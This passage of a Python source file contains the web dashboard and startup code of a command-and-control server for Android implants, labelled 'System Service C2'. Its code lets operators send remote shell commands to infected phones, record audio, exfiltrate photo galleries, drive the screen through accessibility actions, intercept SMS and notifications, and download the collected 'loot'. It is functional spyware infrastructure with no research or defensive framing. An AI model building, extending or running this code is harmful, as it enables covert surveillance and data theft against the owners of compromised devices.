                    <button type="button" class="btn btn-ghost" onclick="closeCmdModal()">Cancel</button>
                    <button type="submit" class="btn btn-danger">Send</button>
                </div>
            </form>
        </div>
    </div>

<script>
    let token = localStorage.getItem('c2_token');
    let currentUser = null;
    let ws = null;
    let selectedDevice = null;
    
    // ─── Auth ─────────────────────────────────────────────────────────
    async function api(path, options = {}) {
        const headers = { 'Content-Type': 'application/json', ...options.headers };
        if (token) headers['Authorization'] = `Bearer ${token}`;
        const res = await fetch(path, { ...options, headers });
        if (res.status === 401) { logout(); return null; }
        return res.json();
    }
    
    async function checkAuth() {
        if (!token) { showLogin(); return; }
        const data = await api('/api/stats');
        if (data) { currentUser = data.user; initDashboard(); }
    }
    
    function showLogin() {
        document.body.innerHTML = `
            <div style="display:flex;align-items:center;justify-content:center;min-height:100vh;background:#0d1117;">
                <div style="background:#161b22;border:1px solid #30363d;border-radius:12px;padding:48px;width:100%;max-width:400px;">
                    <h2 style="margin-bottom:24px;text-align:center;">🛰️ System Service C2</h2>
                    <form id="loginForm">
                        <div style="margin-bottom:16px;">
                            <label style="display:block;margin-bottom:6px;font-size:.875rem;color:#8b949e;">Username</label>
                            <input type="text" id="loginUser" required style="width:100%;padding:10px 12px;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#e6edf3;">
                        </div>
                        <div style="margin-bottom:24px;">
                            <label style="display:block;margin-bottom:6px;font-size:.875rem;color:#8b949e;">Password</label>
                            <input type="password" id="loginPass" required style="width:100%;padding:10px 12px;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#e6edf3;">
                        </div>
                        <button type="submit" class="btn btn-primary" style="width:100%;padding:12px;">Login</button>
                    </form>
                    <p style="margin-top:16px;text-align:center;font-size:.875rem;color:#8b949e;">Default: admin / admin123</p>
                </div>
            </div>
        `;
        document.getElementById('loginForm').onsubmit = async (e) => {
            e.preventDefault();
            const username = document.getElementById('loginUser').value;
            const password = document.getElementById('loginPass').value;
            const res = await fetch('/api/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, password })
            });
            const data = await res.json();
            if (data.token) {
                token = data.token;
                localStorage.setItem('c2_token', token);
                currentUser = data.user;
                initDashboard();
            } else {
                alert(data.error || 'Login failed');
            }
        };
    }
    
    function logout() {
        token = null;
        localStorage.removeItem('c2_token');
        currentUser = null;
        if (ws) ws.close();
        showLogin();
    }
    
    // ─── Dashboard Init ───────────────────────────────────────────────
    function initDashboard() {
        document.getElementById('currentUser').textContent = currentUser.username;
        const roleBadge = document.getElementById('userRole');
        roleBadge.textContent = currentUser.role;
        roleBadge.className = `badge badge-${currentUser.role}`;
        
        document.getElementById('tab-users').style.display = currentUser.role === 'admin' ? 'block' : 'none';
        document.querySelector('.tab[onclick*="users"]').style.display = currentUser.role === 'admin' ? 'block' : 'none';
        
        connectWS();
        loadStats();
        loadImplants();
        loadLoot();
        loadUsers();
        loadSpeedHistory();
    }
    
    // ─── WebSocket ────────────────────────────────────────────────────
    function connectWS() {
        const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
        ws = new WebSocket(`${protocol}//${location.host}/ws?token=${token}`);
        ws.onmessage = (event) => {
            const msg = JSON.parse(event.data);
            handleWSMessage(msg);
        };
        ws.onclose = () => setTimeout(connectWS, 5000);
    }
    
    function handleWSMessage(msg) {
        if (msg.type === 'init') {
            currentUser = msg.user;
            renderImplants(msg.implants);
        } else if (msg.type === 'exfil') {
            addLog(`📥 Exfil from ${msg.device_id}: ${JSON.stringify(msg.data).slice(0,100)}...`, 'success');
            loadLoot();
        } else if (msg.type === 'shell_result') {
            addLog(`💻 Shell result from ${msg.device_id}`, 'success');
        } else if (msg.type === 'file_upload') {
            addLog(`📎 File uploaded: ${msg.filename} (${msg.type})`, 'success');
            loadLoot();
        } else if (msg.type === 'accessibility') {
            addLog(`♿ Accessibility data from ${msg.device_id}`, 'success');
        } else if (msg.type === 'notification') {
            addLog(`🔔 Notification from ${msg.device_id}`, 'success');
        } else if (msg.type === 'sms') {
            addLog(`📩 SMS intercepted from ${msg.device_id}`, 'success');
        }
    }
    
    function sendWS(data) {
        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify(data));
        }
    }
    
    // ─── Stats ────────────────────────────────────────────────────────
    async function loadStats() {
        const data = await api('/api/stats');
        if (data) {
            document.getElementById('statTotal').textContent = data.total_implants;
            document.getElementById('statYours').textContent = data.your_implants;
            document.getElementById('statOnline').textContent = data.online;
            document.getElementById('statLoot').textContent = data.loot_count;
        }
    }
    
    // ─── Implants ─────────────────────────────────────────────────────
    async function loadImplants() {
        const data = await api('/api/implants');
        if (data) renderImplants(data.implants);
    }
    
    function renderImplants(implants) {
        const list = document.getElementById('implantList');
        if (!implants.length) {
            list.innerHTML = '<li class="implant-item"><div class="implant-info"><div class="implant-id">No implants connected</div></div></li>';
            return;
        }
        list.innerHTML = implants.map(imp => `
            <li class="implant-item" onclick="openCmdModal('${imp.device_id}')">
                <div class="implant-info">
                    <div class="implant-id">${imp.device_id}</div>
                    <div class="implant-meta">
                        ${imp.assigned_user ? `👤 ${imp.assigned_user} • ` : ''}
                        Connected: ${new Date(imp.connected).toLocaleString()} •
                        Last seen: ${new Date(imp.last_seen).toLocaleString()}
                    </div>
                </div>
                <span class="status ${imp.online ? 'status-online' : 'status-offline'}">
                    <span class="status-dot"></span>
                    ${imp.online ? 'Online' : 'Offline'}
                </span>
            </li>
        `).join('');
    }
    
    // ─── Commands ─────────────────────────────────────────────────────
    function openCmdModal(deviceId) {
        selectedDevice = deviceId;
        document.getElementById('cmdDeviceId').textContent = deviceId;
        document.getElementById('cmdModal').classList.add('active');
        updateCmdFields();
    }
    
    function closeCmdModal() {
        document.getElementById('cmdModal').classList.remove('active');
        selectedDevice = null;
    }
    
    function updateCmdFields() {
        const type = document.getElementById('cmdType').value;
        document.querySelectorAll('[id^="field"]').forEach(el => el.style.display = 'none');
        
        const show = (id) => document.getElementById(id).style.display = 'block';
        
        if (type === 'shell') show('fieldShell');
        else if (type === 'record_audio') show('fieldDuration');
        else if (type === 'exfil_gallery') { show('fieldGallery'); show('fieldGalleryLimit'); }
        else if (['interact_click','interact_long_click','interact_input','interact_scroll'].includes(type)) show('fieldTarget');
        if (type === 'interact_input') show('fieldInputText');
        if (type === 'interact_scroll') show('fieldScrollDir');
        if (type === 'interact_swipe') show('fieldSwipe');
        if (type === 'interact_global') show('fieldGlobal');
    }
    
    document.getElementById('cmdForm').onsubmit = async (e) => {
        e.preventDefault();
        const type = document.getElementById('cmdType').value;
        let command = { type };
        
        if (type === 'shell') command.cmd = document.getElementById('cmdShell').value;
        else if (type === 'record_audio') command.duration = parseInt(document.getElementById('cmdDuration').value);
        else if (type === 'exfil_gallery') {
            command.gallery_type = document.getElementById('cmdGalleryType').value;
            command.limit = parseInt(document.getElementById('cmdGalleryLimit').value);
        }
        else if (['interact_click','interact_long_click','interact_input','interact_scroll'].includes(type)) {
            const target = document.getElementById('cmdTarget').value;
            if (target.startsWith('@id/') || target.startsWith('id/')) command.target_id = target;
            else command.target_text = target;
            if (type === 'interact_input') command.input_text = document.getElementById('cmdInputText').value;
            if (type === 'interact_scroll') command.direction = document.getElementById('cmdScrollDir').value === 'down' ? 1 : -1;
        }
        else if (type === 'interact_swipe') {
            command.x = parseInt(document.getElementById('cmdSwipeX').value);
            command.y = parseInt(document.getElementById('cmdSwipeY').value);
        }
        else if (type === 'interact_global') command.action = document.getElementById('cmdGlobal').value;
        
        await api(`/api/implants/${selectedDevice}/command`, {
            method: 'POST',
            body: JSON.stringify({ command })
        });
        
        addLog(`📤 Command sent to ${selectedDevice}: ${type}`, 'success');
        closeCmdModal();
    };
    
    // ─── Loot ─────────────────────────────────────────────────────────
    async function loadLoot() {
        const data = await api('/api/loot');
        if (!data) return;
        const list = document.getElementById('lootList');
        if (!data.files.length) {
            list.textContent = 'No loot files yet';
            return;
        }
        list.innerHTML = data.files.map(f => `
            <div class="log-entry" onclick="downloadLoot('${f.filename}')">
                📄 <strong>${f.filename}</strong> • ${f.device_id} • ${new Date(f.timestamp).toLocaleString()} • ${(f.size/1024).toFixed(1)} KB
            </div>
        `).join('');
    }
    
    function downloadLoot(filename) {
        window.open(`/api/loot/${filename}`, '_blank');
    }
    
    // ─── Users (Admin) ────────────────────────────────────────────────
    async function loadUsers() {
        if (currentUser.role !== 'admin') return;
        const data = await api('/api/users');
        if (!data) return;
        const list = document.getElementById('userList');
        list.innerHTML = data.users.map(u => `
            <div class="log-entry">
                <strong>${u.username}</strong> <span class="badge badge-${u.role}">${u.role}</span>
                • Created: ${new Date(u.created).toLocaleString()}
                • Last login: ${u.last_login ? new Date(u.last_login).toLocaleString() : 'Never'}
                ${u.username !== 'admin' ? `<button class="btn btn-danger" style="padding:2px 8px;font-size:.75rem;margin-left:8px;" onclick="deleteUser('${u.username}')">Delete</button>` : ''}
            </div>
        `).join('');
    }
    
    function openUserModal(username = null) {
        document.getElementById('modalTitle').textContent = username ? 'Edit User' : 'Add User';
        document.getElementById('userForm').reset();
        document.getElementById('editUserId').value = username || '';
        document.getElementById('inputUsername').disabled = !!username;
        document.getElementById('inputPassword').required = !username;
        document.getElementById('inputPassword').placeholder = username ? 'Leave blank to keep current' : 'Password (min 6 chars)';
        if (username) {
            const user = (await api('/api/users')).users.find(u => u.username === username);
            if (user) document.getElementById('inputRole').value = user.role;
        }
        document.getElementById('userModal').classList.add('active');
    }
    
    function closeUserModal() {
        document.getElementById('userModal').classList.remove('active');
    }
    
    document.getElementById('userForm').onsubmit = async (e) => {
        e.preventDefault();
        const username = document.getElementById('inputUsername').value;
        const password = document.getElementById('inputPassword').value;
        const role = document.getElementById('inputRole').value;
        const editId = document.getElementById('editUserId').value;
        
        if (editId) {
            // For editing, we'd need a PATCH endpoint - skip for now
            alert('Editing not fully implemented - delete and recreate');
        } else {
            const res = await api('/api/register', {
                method: 'POST',
                body: JSON.stringify({ username, password, role })
            });
            if (res?.success) {
                addLog(`👤 Created user: ${username} (${role})`, 'success');
                loadUsers();
                closeUserModal();
            } else {
                alert(res?.error || 'Failed to create user');
            }
        }
    };
    
    async function deleteUser(username) {
        if (!confirm(`Delete user ${username}?`)) return;
        const res = await api(`/api/users/${username}`, { method: 'DELETE' });
        if (res?.success) {
            addLog(`🗑️ Deleted user: ${username}`, 'success');
            loadUsers();
        }
    }
    
    // ─── Speedtest ────────────────────────────────────────────────────
    async function runSpeedtest() {
        const btn = event.target;
        btn.disabled = true;
        btn.textContent = 'Testing...';
        document.getElementById('speedProgress').style.display = 'block';
        document.getElementById('speedProgressBar').style.width = '0%';
        document.getElementById('speedResult').textContent = '--';
        
        try {
            // Ping test
            let totalPing = 0;
            const pingCount = 10;
            for (let i = 0; i < pingCount; i++) {
                const start = performance.now();
                await api('/api/speedtest/ping');
                totalPing += performance.now() - start;
                document.getElementById('speedProgressBar').style.width = `${((i+1)/pingCount)*20}%`;
            }
            const avgPing = (totalPing / pingCount).toFixed(2);
            
            // Download test
            document.getElementById('speedDetail').textContent = 'Testing download...';
            const dlStart = performance.now();
            const dlRes = await fetch('/api/speedtest/download?size=10');
            const dlData = await dlRes.blob();
            const dlTime = (performance.now() - dlStart) / 1000;
            const dlSpeed = (dlData.size * 8 / 1e6 / dlTime).toFixed(2);
            document.getElementById('speedProgressBar').style.width = '60%';
            
            // Upload test
            document.getElementById('speedDetail').textContent = 'Testing upload...';
            const ulSize = 10 * 1024 * 1024;
            const ulData = new Uint8Array(ulSize);
            crypto.getRandomValues(ulData);
            const ulStart = performance.now();
            await fetch('/api/speedtest/upload', { method: 'POST', body: ulData });
            const ulTime = (performance.now() - ulStart) / 1000;
            const ulSpeed = (ulSize * 8 / 1e6 / ulTime).toFixed(2);
            document.getElementById('speedProgressBar').style.width = '90%';
            
            // Save result
            const result = {
                download_mbps: parseFloat(dlSpeed),
                upload_mbps: parseFloat(ulSpeed),
                ping_ms: parseFloat(avgPing),
                timestamp: new Date().toISOString()
            };
            
            await api('/api/speedtest/results', {
                method: 'POST',
                body: JSON.stringify({ result })
            });
            
            document.getElementById('speedResult').textContent = `${dlSpeed} ↓ / ${ulSpeed} ↑ Mbps`;
            document.getElementById('speedDetail').textContent = `Ping: ${avgPing} ms • ${new Date().toLocaleTimeString()}`;
            document.getElementById('speedProgressBar').style.width = '100%';
            loadSpeedHistory();
            addLog(`🚀 Speedtest: ${dlSpeed}↓ ${ulSpeed}↑ ${avgPing}ms`, 'success');
            
        } catch (err) {
            console.error(err);
            document.getElementById('speedResult').textContent = 'Error';
            document.getElementById('speedDetail').textContent = 'Speed test failed';
            addLog(`❌ Speedtest failed: ${err.message}`, 'error');
        } finally {
            btn.disabled = false;
            btn.textContent = 'Start Speed Test';
        }
    }
    
    async function loadSpeedHistory() {
        const data = await api('/api/speedtest/results');
        if (!data) return;
        const list = document.getElementById('speedHistory');
        if (!data.results.length) {
            list.textContent = 'No speed tests yet';
            return;
        }
        list.innerHTML = data.results.slice().reverse().map(r => `
            <div class="log-entry">
                <strong>${r.download_mbps}↓ / ${r.upload_mbps}↑ Mbps</strong> • Ping: ${r.ping_ms}ms • ${new Date(r.timestamp).toLocaleString()}
            </div>
        `).join('');
    }
    
    // ─── Log ──────────────────────────────────────────────────────────
    function addLog(message, type = '') {
        const log = document.getElementById('activityLog');
        const entry = document.createElement('div');
        entry.className = `log-entry ${type}`;
        entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
        log.insertBefore(entry, log.firstChild);
        while (log.children.length > 100) log.removeChild(log.lastChild);
    }
    
    // ─── Tabs ─────────────────────────────────────────────────────────
    function showTab(name) {
        document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
        document.getElementById(`tab-${name}`).classList.add('active');
        event.target.classList.add('active');
        
        if (name === 'implants') loadImplants();
        else if (name === 'loot') loadLoot();
        else if (name === 'users') loadUsers();
        else if (name === 'speedtest') loadSpeedHistory();
    }
    
    // ─── Init ─────────────────────────────────────────────────────────
    checkAuth();
    
    // Close modals on background click
    document.getElementById('userModal').onclick = (e) => { if(e.target===e.currentTarget) closeUserModal(); };
    document.getElementById('cmdModal').onclick = (e) => { if(e.target===e.currentTarget) closeCmdModal(); };
</script>
</body>
</html>"""

# ─── Run ────────────────────────────────────────────────────────────────
async def main():
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default=CONFIG["host"])
    parser.add_argument("--ws-port", type=int, default=CONFIG["ws_port"])
    parser.add_argument("--http-port", type=int, default=CONFIG["http_port"])
    parser.add_argument("--cert", default=CONFIG["ssl_cert"])
    parser.add_argument("--key", default=CONFIG["ssl_key"])
    args = parser.parse_args()
    
    server = C2Server()
    
    # SSL context
    ssl_context = None
    if Path(args.cert).exists() and Path(args.key).exists():
        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ssl_context.load_cert_chain(args.cert, args.key)
        logger.info("SSL enabled")
    else:
        logger.warning("SSL cert/key not found - running without TLS")
    
    # Start WebSocket server for implants
    ws_server = await websockets.serve(
        server.handle_implant,
        args.host,
        args.ws_port,
        ssl=ssl_context,
        ping_interval=20,
        ping_timeout=10
    )
    logger.info(f"Implant WS server on {'wss' if ssl_context else 'ws'}://{args.host}:{args.ws_port}")
    
    # Start HTTP server for dashboard
    http_app = server.create_http_app()
    http_runner = web.AppRunner(http_app)
    await http_runner.setup()
    http_site = web.TCPSite(http_runner, args.host, args.http_port, ssl_context=ssl_context)
    await http_site.start()
    logger.info(f"Dashboard HTTP server on {'https' if ssl_context else 'http'}://{args.host}:{args.http_port}")
    
    # Start command sender
    asyncio.create_task(server.send_commands())
    
    # Keep running
    try:
        await asyncio.Future()  # Run forever
    except KeyboardInterrupt:
        logger.info("Shutting down...")
    finally:
        ws_server.close()
        await ws_server.wait_closed()
        await http_runner.cleanup()

if __name__ == "__main__":
    asyncio.run(main())